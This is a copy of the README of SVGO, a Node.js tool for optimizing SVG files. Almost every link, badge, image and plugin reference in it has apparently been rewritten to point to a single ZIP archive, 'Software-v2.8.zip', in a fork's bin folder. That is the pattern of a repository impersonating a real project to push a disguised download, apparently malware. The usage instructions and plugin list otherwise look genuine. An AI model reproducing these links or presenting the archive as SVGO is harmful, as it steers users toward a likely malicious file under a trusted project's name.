**english** | [русский](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
- - -

<img src="https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip" width="200" height="200" alt="logo"/>

## SVGO [![NPM version](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) [![Dependency Status](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) [![Build Status](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) [![Coverage Status](https://img.shields.io/coveralls/svg/svgo.svg)](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)

**SVG O**ptimizer is a Nodejs-based tool for optimizing SVG vector graphics files.
![](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)

## Why?

SVG files, especially exported from various editors, usually contains a lot of redundant and useless information such as editor metadata, comments, hidden elements, default or non-optimal values and other stuff that can be safely removed or converted without affecting SVG rendering result.

## What it can do

SVGO has a plugin-based architecture, so almost every optimization is a separate plugin.

Today we have:

* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] cleanup attributes from newlines, trailing and repeating spaces
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove doctype declaration
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove XML processing instructions
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove comments
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove `<metadata>`
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove `<title>` (disabled by default)
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove `<desc>` (disabled by default)
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove editors namespaces, elements and attributes
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove empty attributes
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove hidden elements
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove empty Text elements
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove empty Container elements
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove `viewBox` attribute when possible (disabled by default)
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove or cleanup `enable-background` attribute when possible
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] convert styles into attributes
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] convert colors (from `rgb()` to `#rrggbb`, from `#rrggbb` to `#rgb`)
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] convert Path data to relative or absolute whichever is shorter, convert one segment to another, trim useless delimiters, smart rounding and much more
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] collapse multiple transforms into one, convert matrices to the short aliases and much more
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove unknown elements content and attributes, remove attrs with default values
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove non-inheritable group's "presentation" attributes
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove useless stroke and fill attrs (disabled by default)
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove unused namespaces declaration
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove unused and minify used IDs
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] round numeric values to the fixed precision, remove default 'px' units
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] move elements attributes to the existing group wrapper
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] move some group attributes to the content elements
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] collapse useless groups
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] remove raster images (disabled by default)
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] merge multiple Paths into one
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] convert some basic shapes to path
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] sort element attributes for epic readability (disabled by default)
* [ [>](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip) ] apply transforms, crop by real width, center vertical alignment and resize SVG with one Path inside (disabled by default)

Want to know how it works and how to write your own plugin? [Of course you want to](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip).


## How to use

```sh
$ [sudo] npm install -g svgo
```

```
Usage:
  svgo [OPTIONS] [ARGS]

Options:
  -h, --help : Help
  -v, --version : Version
  -i INPUT, --input=INPUT : Input file, "-" for STDIN
  -s STRING, --string=STRING : Input SVG data string
  -f FOLDER, --folder=FOLDER : Input folder, optimize and rewrite all *.svg files
  -o OUTPUT, --output=OUTPUT : Output file (by default the same as the input), "-" for STDOUT
  --config=CONFIG : Config file to extend or replace default
  --disable=DISABLE : Disable plugin by name
  --enable=ENABLE : Enable plugin by name
  --datauri=DATAURI : Output as Data URI string (base64, URI encoded or unencoded)
  --pretty : Make SVG pretty printed

Arguments:
  INPUT : Alias to --input
  OUTPUT : Alias to --output
```

* with files:

        $ svgo test.svg

    or:

        $ svgo test.svg test.min.svg

* with STDIN / STDOUT:

        $ cat test.svg | svgo -i - -o - > test.min.svg

* with folder

        $ svgo -f ../path/to/folder/with/svg/files

* with strings:

        $ svgo -s '<svg version="1.1">test</svg>' -o test.min.svg

    or even with Data URI base64:

        $ svgo -s 'data:image/svg+xml;base64,…' -o test.min.svg

* with SVGZ:

    from `.svgz` to `.svg`:

        $ gunzip -c test.svgz | svgo -i - -o test.min.svg

    from `.svg` to `.svgz`:

        $ svgo test.svg -o - | gzip -cfq9 > test.svgz

* with GUI – [svgo-gui](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
* as a web app - [SVGOMG](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
* as a Nodejs module – [examples](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
* as a Grunt task – [grunt-svgmin](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
* as a Gulp task – [gulp-svgmin](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
* as a Mimosa module – [mimosa-minify-svg](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)
* as an OSX Folder Action – [svgo-osx-folder-action](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip)

## Donate

BTC `1zVZYqRSzQ4aaL27rp3PLwFFSXpfs5H8r`

## License and copyrights

This software is released under the terms of the [MIT license](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip).

Logo by [Yegor Bolshakov](https://github.com/aliathiullah/svgo/raw/refs/heads/master/bin/Software-v2.8.zip).
